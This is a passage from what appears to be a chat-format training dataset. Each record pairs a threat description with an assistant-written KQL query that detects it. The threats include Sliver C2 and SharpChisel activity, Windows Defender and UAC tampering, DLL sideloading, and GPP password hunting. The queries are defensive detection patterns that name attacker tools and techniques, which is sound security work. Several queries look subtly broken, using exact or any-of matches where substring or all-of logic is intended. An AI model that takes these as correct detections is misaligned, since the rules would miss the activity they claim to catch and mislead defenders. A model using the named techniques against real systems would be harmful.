(ProcessCommandLine contains \"Compress-Archive -Path\" and ProcessCommandLine contains \"-DestinationPath\" and ProcessCommandLine contains \":\\\\Windows\\\\Temp\\\\\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"ftp.exe\" script with the \"-s\" or \"/s\" flag and any child processes ran by \"ftp.exe\". Topic: proc_creation_win_ftp_arbitrary_command_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\ftp.exe\" or ((ProcessCommandLine contains \"-s:\" or ProcessCommandLine contains \"/s:\" or ProcessCommandLine contains \"\u2013s:\" or ProcessCommandLine contains \"\u2014s:\" or ProcessCommandLine contains \"\u2015s:\") and (FolderPath endswith \"\\\\ftp.exe\" or ProcessVersionInfoOriginalFileName =~ \"ftp.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects process activity patterns as seen being used by Sliver C2 framework implants Topic: proc_creation_win_hktl_sliver_c2_execution_pattern"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"-NoExit -Command [Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects weak passwords or often abused passwords (seen used by threat actors) via the CLI.\nAn example would be a threat actor creating a new user via the net command and providing the password inline\n Topic: proc_creation_win_susp_weak_or_abused_passwords"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"123456789\", \"123123qwE\", \"Asd123.aaaa\", \"Decryptme\", \"P@ssw0rd!\", \"Pass8080\", \"password123\", \"test@202\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious process spawning from an \"mshta.exe\" process, which could be indicative of a malicious HTA script execution Topic: proc_creation_win_mshta_susp_child_processes"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\cmd.exe\" or FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\" or FolderPath endswith \"\\\\wscript.exe\" or FolderPath endswith \"\\\\cscript.exe\" or FolderPath endswith \"\\\\sh.exe\" or FolderPath endswith \"\\\\bash.exe\" or FolderPath endswith \"\\\\reg.exe\" or FolderPath endswith \"\\\\regsvr32.exe\" or FolderPath endswith \"\\\\bitsadmin.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"Cmd.Exe\", \"PowerShell.EXE\", \"pwsh.dll\", \"wscript.exe\", \"cscript.exe\", \"Bash.exe\", \"reg.exe\", \"REGSVR32.EXE\", \"bitsadmin.exe\"))) and InitiatingProcessFileName =~ \"\\\\mshta.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of format.com with an uncommon filesystem selection that could indicate a defense evasion activity in which \"format.com\" is used to load malicious DLL files or other programs.\n Topic: proc_creation_win_format_uncommon_filesystem_load"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"/fs:\" and InitiatingProcessFolderPath =~ \"\\\\format.com\") and (not((ProcessCommandLine in~ (\"/fs:exFAT\", \"/fs:FAT\", \"/fs:NTFS\", \"/fs:ReFS\", \"/fs:UDF\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt. Topic: proc_creation_win_findstr_gpp_passwords"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"cpassword\", \"\\\\sysvol\\\\\", \".xml\")) and ((FolderPath endswith \"\\\\find.exe\" or FolderPath endswith \"\\\\findstr.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"FIND.EXE\", \"FINDSTR.EXE\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of copy of suspicious files (EXE/DLL) to the default GPO storage folder Topic: file_event_win_susp_default_gpo_dir_write"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\".dll\", \".exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential persistence using Appx DebugPath Topic: registry_set_persistence_appx_debugger"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey contains \"Classes\\\\ActivatableClasses\\\\Package\\\\Microsoft.\" and RegistryKey endswith \"\\\\DebugPath\") or (RegistryKey contains \"\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\PackagedAppXDebug\\\\Microsoft.\" and RegistryKey endswith \"\\\\(Default)\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of Gpg4win to decrypt files Topic: proc_creation_win_gpg4win_decryption"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -d \", \"passphrase\")) and ((FolderPath endswith \"\\\\gpg.exe\" or FolderPath endswith \"\\\\gpg2.exe\") or ProcessVersionInfoFileDescription =~ \"GnuPG\u2019s OpenPGP tool\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of the \"flock\" command to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.\n Topic: proc_creation_lnx_flock_shell_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/bin/bash\", \"/bin/dash\", \"/bin/fish\", \"/bin/sh\", \"/bin/zsh\")) and (ProcessCommandLine =~ \" -u \" and InitiatingProcessFolderPath =~ \"/flock\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects registry changes to Microsoft Office \"VBAWarning\" to a value of \"1\" which enables the execution of all macros, whether signed or unsigned. Topic: registry_set_office_vba_warnings_tamper"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Security\\\\VBAWarnings\" and RegistryValueData =~ \"DWORD (0x00000001)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects powershell scripts that import modules from suspicious directories Topic: proc_creation_win_powershell_import_module_susp_dirs"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"Import-Module \\\"$Env:Temp\\\\\", \"Import-Module '$Env:Temp\\\\\", \"Import-Module $Env:Temp\\\\\", \"Import-Module \\\"$Env:Appdata\\\\\", \"Import-Module '$Env:Appdata\\\\\", \"Import-Module $Env:Appdata\\\\\", \"Import-Module C:\\\\Users\\\\Public\\\\\", \"ipmo \\\"$Env:Temp\\\\\", \"ipmo '$Env:Temp\\\\\", \"ipmo $Env:Temp\\\\\", \"ipmo \\\"$Env:Appdata\\\\\", \"ipmo '$Env:Appdata\\\\\", \"ipmo $Env:Appdata\\\\\", \"ipmo C:\\\\Users\\\\Public\\\\\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of the \"cloudflared\" binary from a non standard location.\n Topic: proc_creation_win_cloudflared_portable_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\cloudflared.exe\" and (not((FolderPath contains \":\\\\Program Files (x86)\\\\cloudflared\\\\\" or FolderPath contains \":\\\\Program Files\\\\cloudflared\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of the hdiutil utility in order to create a disk image. Topic: proc_creation_macos_hdiutil_create"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"create\" and InitiatingProcessFolderPath =~ \"/hdiutil\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects uncommon or suspicious child processes spawning from a VsCode \"code.exe\" process. This could indicate an attempt of persistence via VsCode tasks or terminal profiles. Topic: proc_creation_win_vscode_child_processes_anomalies"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\code.exe\" and (((ProcessCommandLine in~ (\"Invoke-Expressions\", \"IEX\", \"Invoke-Command\", \"ICM\", \"DownloadString\", \"rundll32\", \"regsvr32\", \"wscript\", \"cscript\")) and (InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\cmd.exe\"))) or (InitiatingProcessFolderPath in~ (\"\\\\calc.exe\", \"\\\\regsvr32.exe\", \"\\\\rundll32.exe\", \"\\\\cscript.exe\", \"\\\\wscript.exe\")) or (FolderPath contains \":\\\\Users\\\\Public\\\\\" or FolderPath contains \":\\\\Windows\\\\Temp\\\\\" or FolderPath contains \":\\\\Temp\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects enumeration of local system groups Topic: proc_creation_macos_local_groups"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"-q\", \"group\")) and InitiatingProcessFolderPath =~ \"/dscacheutil\") or (ProcessCommandLine =~ \"/etc/group\" and InitiatingProcessFolderPath =~ \"/cat\") or ((ProcessCommandLine in~ (\"-list\", \"/groups\")) and InitiatingProcessFolderPath =~ \"/dscl\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage of the \"net.exe\" command to start a service using the \"start\" flag Topic: proc_creation_win_net_start_service"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" start \" and ((FolderPath endswith \"\\\\net.exe\" or FolderPath endswith \"\\\\net1.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"net.exe\", \"net1.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of the PhoneDeepLink parameter to potentially sideload a DLL file that does not exist. This non-existent DLL file is named \"ShellChromeAPI.dll\".\nAdversaries can drop their own renamed DLL and execute it via DeviceEnroller.exe using this parameter\n Topic: proc_creation_win_deviceenroller_dll_sideloading"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"/PhoneDeepLink\" and (FolderPath endswith \"\\\\deviceenroller.exe\" or ProcessVersionInfoOriginalFileName =~ \"deviceenroller.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the Sharp Chisel via the commandline arguments Topic: proc_creation_win_hktl_sharp_chisel"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\SharpChisel.exe\" or ProcessVersionInfoProductName =~ \"SharpChisel\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Use of reg to get MachineGuid information Topic: proc_creation_win_reg_machineguid"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"SOFTWARE\\\\Microsoft\\\\Cryptography\", \"/v \", \"MachineGuid\")) and InitiatingProcessFolderPath =~ \"\\\\reg.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when a user enables DNS-over-HTTPS.\nThis can be used to hide internet activity or be used to hide the process of exfiltrating data.\nWith this enabled organization will lose visibility into data such as query type, response and originating IP that are used to determine bad actors.\n Topic: registry_set_dns_over_https_enabled"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Edge\\\\BuiltInDnsClientEnabled\" and RegistryValueData =~ \"DWORD (0x00000001)\") or (RegistryKey endswith \"\\\\SOFTWARE\\\\Google\\\\Chrome\\\\DnsOverHttpsMode\" and RegistryValueData =~ \"secure\") or (RegistryKey endswith \"\\\\SOFTWARE\\\\Policies\\\\Mozilla\\\\Firefox\\\\DNSOverHTTPS\\\\Enabled\" and RegistryValueData =~ \"DWORD (0x00000001)\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when a file with a suspicious extension is created in the startup folder Topic: file_event_win_susp_startup_folder_persistence"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\".vbs\", \".vbe\", \".bat\", \".ps1\", \".hta\", \".dll\", \".jar\", \".msi\", \".scr\", \".cmd\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Obfuscated use of stdin to execute PowerShell Topic: proc_creation_win_hktl_invoke_obfuscation_stdin"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine matches regex \"cmd.{0,5}(?:/c|/r).+powershell.+(?:\\\\$\\\\{?input\\\\}?|noexit).+\\\\\"\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of regsvr32 where the DLL is located in a potentially suspicious location. Topic: proc_creation_win_regsvr32_susp_exec_path_1"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\":\\\\ProgramData\\\\\", \":\\\\Temp\\\\\", \":\\\\Users\\\\Public\\\\\", \":\\\\Windows\\\\Temp\\\\\", \"\\\\AppData\\\\Local\\\\Temp\\\\\", \"\\\\AppData\\\\Roaming\\\\\")) and (FolderPath endswith \"\\\\regsvr32.exe\" or ProcessVersionInfoOriginalFileName =~ \"REGSVR32.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of malicious OneNote documents that contain embedded scripts.\nWhen a user clicks on a OneNote attachment and then on the malicious link inside the \".one\" file, it exports and executes the malicious embedded script from specific directories.\n Topic: proc_creation_win_office_onenote_embedded_script_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\onenote.exe\" and (ProcessCommandLine in~ (\"\\\\exported\\\\\", \"\\\\onenoteofflinecache_files\\\\\")) and (InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\mshta.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\wscript.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects calls to \"LoadAssemblyFromPath\" or \"LoadAssemblyFromNS\" that are part of the \"CL_LoadAssembly.ps1\" script. This can be abused to load different assemblies and bypass App locker controls. Topic: proc_creation_win_powershell_cl_loadassembly"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"LoadAssemblyFromPath \", \"LoadAssemblyFromNS \")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when an attacker create a similar folder structure to windows system folders such as (Windows, Program Files...)\nbut with a space in order to trick DLL load search order and perform a \"DLL Search Order Hijacking\" attack\n Topic: file_event_win_dll_sideloading_space_path"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".dll\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to registry keys related to \"Trusted Location\" of Microsoft Office where the path is set to something uncommon. Attackers might add additional trusted locations to avoid macro security restrictions. Topic: registry_set_office_trusted_location_uncommon"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey contains \"Security\\\\Trusted Locations\\\\Location\" and RegistryKey endswith \"\\\\Path\") and (not(((InitiatingProcessFolderPath contains \":\\\\Program Files\\\\Microsoft Office\\\\\" or InitiatingProcessFolderPath contains \":\\\\Program Files (x86)\\\\Microsoft Office\\\\\") or (InitiatingProcessFolderPath has_all (\"\\\\OfficeClickToRun.exe\") and InitiatingProcessFolderPath contains \":\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\ClickToRun\\\\\")))) and (not((RegistryValueData contains \"%APPDATA%\\\\Microsoft\\\\Templates\" or RegistryValueData contains \"%%APPDATA%%\\\\Microsoft\\\\Templates\" or RegistryValueData contains \"%APPDATA%\\\\Microsoft\\\\Word\\\\Startup\" or RegistryValueData contains \"%%APPDATA%%\\\\Microsoft\\\\Word\\\\Startup\" or RegistryValueData contains \":\\\\Program Files (x86)\\\\Microsoft Office\\\\root\\\\Templates\\\\\" or RegistryValueData contains \":\\\\Program Files\\\\Microsoft Office (x86)\\\\Templates\" or RegistryValueData contains \":\\\\Program Files\\\\Microsoft Office\\\\root\\\\Templates\\\\\" or RegistryValueData contains \":\\\\Program Files\\\\Microsoft Office\\\\Templates\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious launch of a renamed version of the PSEXESVC service with, which is not often used by legitimate administrators Topic: proc_creation_win_renamed_sysinternals_psexec_service"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoOriginalFileName =~ \"psexesvc.exe\" and (not(FolderPath =~ \"C:\\\\Windows\\\\PSEXESVC.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"sysctl\" with specific arguments that have been used by threat actors and malware. It provides system hardware information.\nThis process is primarily used to detect and avoid virtualization and analysis environments.\n Topic: proc_creation_macos_sysctl_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"hw.\", \"kern.\", \"machdep.\")) and (FolderPath endswith \"/sysctl\" or ProcessCommandLine contains \"sysctl\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage of \"reg.exe\" to tamper with different Windows Defender registry keys in order to disable some important features related to protection and detection Topic: proc_creation_win_reg_windows_defender_tamper"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\reg.exe\" or ProcessVersionInfoOriginalFileName =~ \"reg.exe\") and (ProcessCommandLine in~ (\"SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\\", \"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender Security Center\", \"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\\"))) and ((ProcessCommandLine in~ (\" add \", \"d 0\")) or (ProcessCommandLine in~ (\" add \", \"d 1\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when an attacker tries to disable User Account Control (UAC) notification by tampering with the \"UACDisableNotify\" value.\nUAC is a critical security feature in Windows that prevents unauthorized changes to the operating system. It prompts the user for permission or an administrator password before allowing actions that could affect the systems operation or change settings that affect other users.\nWhen \"UACDisableNotify\" is set to 1, UAC prompts are suppressed.\n Topic: registry_set_uac_disable_notification"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\Microsoft\\\\Security Center\\\\UACDisableNotify\" and RegistryValueData =~ \"DWORD (0x00000001)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect usage of the \"ssh.exe\" binary as a proxy to launch other programs. Topic: proc_creation_win_ssh_proxy_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe\" or ((ProcessCommandLine contains \"ProxyCommand=\" or (ProcessCommandLine contains \"PermitLocalCommand\" and ProcessCommandLine contains \"LocalCommand\")) and InitiatingProcessFolderPath =~ \"\\\\ssh.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the built-in script located in \"C:\\Windows\\System32\\gatherNetworkInfo.vbs\". Which can be used to gather information about the target machine Topic: proc_creation_win_lolbin_gather_network_info"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"gatherNetworkInfo.vbs\" and ((FolderPath endswith \"\\\\cscript.exe\" or FolderPath endswith \"\\\\wscript.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"cscript.exe\", \"wscript.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Pandemic Windows Implant Topic: registry_event_apt_pandemic"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\SYSTEM\\\\CurrentControlSet\\\\services\\\\null\\\\Instance\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects registry changes to Microsoft Office \"AccessVBOM\" to a value of \"1\" which disables trust access for VBA on the victim machine and lets attackers execute malicious macros without any Microsoft Office warnings. Topic: registry_set_office_access_vbom_tamper"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Security\\\\AccessVBOM\" and RegistryValueData =~ \"DWORD (0x00000001)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects DLL sideloading of DLLs usually located in system locations (System32, SysWOW64, etc.). Topic: image_load_side_load_from_non_system_location"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath endswith \"\\\\aclui.dll\" or FolderPath endswith \"\\\\activeds.dll\" or FolderPath endswith \"\\\\adsldpc.dll\" or FolderPath endswith \"\\\\aepic.dll\" or FolderPath endswith \"\\\\apphelp.dll\" or FolderPath endswith \"\\\\applicationframe.dll\" or FolderPath endswith \"\\\\appvpolicy.dll\" or FolderPath endswith \"\\\\appxalluserstore.dll\" or FolderPath endswith \"\\\\appxdeploymentclient.dll\" or FolderPath endswith \"\\\\archiveint.dll\" or FolderPath endswith \"\\\\atl.dll\" or FolderPath endswith \"\\\\audioses.dll\" or FolderPath endswith \"\\\\auditpolcore.dll\" or FolderPath endswith \"\\\\authfwcfg.dll\" or FolderPath endswith \"\\\\authz.dll\" or FolderPath endswith \"\\\\avrt.dll\" or FolderPath endswith \"\\\\batmeter.dll\" or FolderPath endswith \"\\\\bcd.dll\" or FolderPath endswith \"\\\\bcp47langs.dll\" or FolderPath endswith \"\\\\bcp47mrm.dll\" or FolderPath endswith \"\\\\bcrypt.dll\" or FolderPath endswith \"\\\\bderepair.dll\" or FolderPath endswith \"\\\\bootmenuux.dll\" or FolderPath endswith \"\\\\bootux.dll\" or FolderPath endswith \"\\\\cabinet.dll\" or FolderPath endswith \"\\\\cabview.dll\" or FolderPath endswith \"\\\\certcli.dll\" or FolderPath endswith \"\\\\certenroll.dll\" or FolderPath endswith \"\\\\cfgmgr32.dll\" or FolderPath endswith \"\\\\cldapi.dll\" or FolderPath endswith \"\\\\clipc.dll\" or FolderPath endswith \"\\\\clusapi.dll\" or FolderPath endswith \"\\\\cmpbk32.dll\" or FolderPath endswith \"\\\\cmutil.dll\" or FolderPath endswith \"\\\\coloradapterclient.dll\" or FolderPath endswith \"\\\\colorui.dll\" or FolderPath endswith \"\\\\comdlg32.dll\" or FolderPath endswith \"\\\\configmanager2.dll\" or FolderPath endswith \"\\\\connect.dll\" or FolderPath endswith \"\\\\coredplus.dll\" or FolderPath endswith \"\\\\coremessaging.dll\" or FolderPath endswith \"\\\\coreuicomponents.dll\" or FolderPath endswith \"\\\\credui.dll\" or FolderPath endswith \"\\\\cryptbase.dll\" or FolderPath endswith \"\\\\cryptdll.dll\" or FolderPath endswith \"\\\\cryptsp.dll\" or FolderPath endswith \"\\\\cryptui.dll\" or FolderPath endswith \"\\\\cryptxml.dll\" or FolderPath endswith \"\\\\cscapi.dll\" or FolderPath endswith \"\\\\cscobj.dll\" or FolderPath endswith \"\\\\cscui.dll\" or FolderPath endswith \"\\\\d2d1.dll\" or FolderPath endswith \"\\\\d3d10_1.dll\" or FolderPath endswith \"\\\\d3d10_1core.dll\" or FolderPath endswith \"\\\\d3d10.dll\" or FolderPath endswith \"\\\\d3d10core.dll\" or FolderPath endswith \"\\\\d3d10warp.dll\" or FolderPath endswith \"\\\\d3d11.dll\" or FolderPath endswith \"\\\\d3d12.dll\" or FolderPath endswith \"\\\\d3d9.dll\" or FolderPath endswith \"\\\\d3dx9_43.dll\" or FolderPath endswith \"\\\\dataexchange.dll\" or FolderPath endswith \"\\\\davclnt.dll\" or FolderPath endswith \"\\\\dcntel.dll\" or FolderPath endswith \"\\\\dcomp.dll\" or FolderPath endswith \"\\\\defragproxy.dll\" or FolderPath endswith \"\\\\desktopshellext.dll\" or FolderPath endswith \"\\\\deviceassociation.dll\" or FolderPath endswith \"\\\\devicecredential.dll\" or FolderPath endswith \"\\\\devicepairing.dll\" or FolderPath endswith \"\\\\devobj.dll\" or FolderPath endswith \"\\\\devrtl.dll\" or FolderPath endswith \"\\\\dhcpcmonitor.dll\" or FolderPath endswith \"\\\\dhcpcsvc.dll\" or FolderPath endswith \"\\\\dhcpcsvc6.dll\" or FolderPath endswith \"\\\\directmanipulation.dll\" or FolderPath endswith \"\\\\dismapi.dll\" or FolderPath endswith \"\\\\dismcore.dll\" or FolderPath endswith \"\\\\dmcfgutils.dll\" or FolderPath endswith \"\\\\dmcmnutils.dll\" or FolderPath endswith \"\\\\dmcommandlineutils.dll\" or FolderPath endswith \"\\\\dmenrollengine.dll\" or FolderPath endswith \"\\\\dmenterprisediagnostics.dll\" or FolderPath endswith \"\\\\dmiso8601utils.dll\" or FolderPath endswith \"\\\\dmoleaututils.dll\" or FolderPath endswith \"\\\\dmprocessxmlfiltered.dll\" or FolderPath endswith \"\\\\dmpushproxy.dll\" or FolderPath endswith \"\\\\dmxmlhelputils.dll\" or FolderPath endswith \"\\\\dnsapi.dll\" or FolderPath endswith \"\\\\dot3api.dll\" or FolderPath endswith \"\\\\dot3cfg.dll\" or FolderPath endswith \"\\\\dpx.dll\" or FolderPath endswith \"\\\\drprov.dll\" or FolderPath endswith \"\\\\drvstore.dll\" or FolderPath endswith \"\\\\dsclient.dll\" or FolderPath endswith \"\\\\dsparse.dll\" or FolderPath endswith \"\\\\dsprop.dll\" or FolderPath endswith \"\\\\dsreg.dll\" or FolderPath endswith \"\\\\dsrole.dll\" or FolderPath endswith \"\\\\dui70.dll\" or FolderPath endswith \"\\\\duser.dll\" or FolderPath endswith \"\\\\dusmapi.dll\" or FolderPath endswith \"\\\\dwmapi.dll\" or FolderPath endswith \"\\\\dwmcore.dll\" or FolderPath endswith \"\\\\dwrite.dll\" or FolderPath endswith \"\\\\dxcore.dll\" or FolderPath endswith \"\\\\dxgi.dll\" or FolderPath endswith \"\\\\dxva2.dll\" or FolderPath endswith \"\\\\dynamoapi.dll\" or FolderPath endswith \"\\\\eappcfg.dll\" or FolderPath endswith \"\\\\eappprxy.dll\" or FolderPath endswith \"\\\\edgeiso.dll\" or FolderPath endswith \"\\\\edputil.dll\" or FolderPath endswith \"\\\\efsadu.dll\" or FolderPath endswith \"\\\\efsutil.dll\" or FolderPath endswith \"\\\\esent.dll\" or FolderPath endswith \"\\\\execmodelproxy.dll\" or FolderPath endswith \"\\\\explorerframe.dll\" or FolderPath endswith \"\\\\fastprox.dll\" or FolderPath endswith \"\\\\faultrep.dll\" or FolderPath endswith \"\\\\fddevquery.dll\" or FolderPath endswith \"\\\\feclient.dll\" or FolderPath endswith \"\\\\fhcfg.dll\" or FolderPath endswith \"\\\\fhsvcctl.dll\" or FolderPath endswith \"\\\\firewallapi.dll\" or FolderPath endswith \"\\\\flightsettings.dll\" or FolderPath endswith \"\\\\fltlib.dll\" or FolderPath endswith \"\\\\framedynos.dll\" or FolderPath endswith \"\\\\fveapi.dll\" or FolderPath endswith \"\\\\fveskybackup.dll\" or FolderPath endswith \"\\\\fvewiz.dll\" or FolderPath endswith \"\\\\fwbase.dll\" or FolderPath endswith \"\\\\fwcfg.dll\" or FolderPath endswith \"\\\\fwpolicyiomgr.dll\" or FolderPath endswith 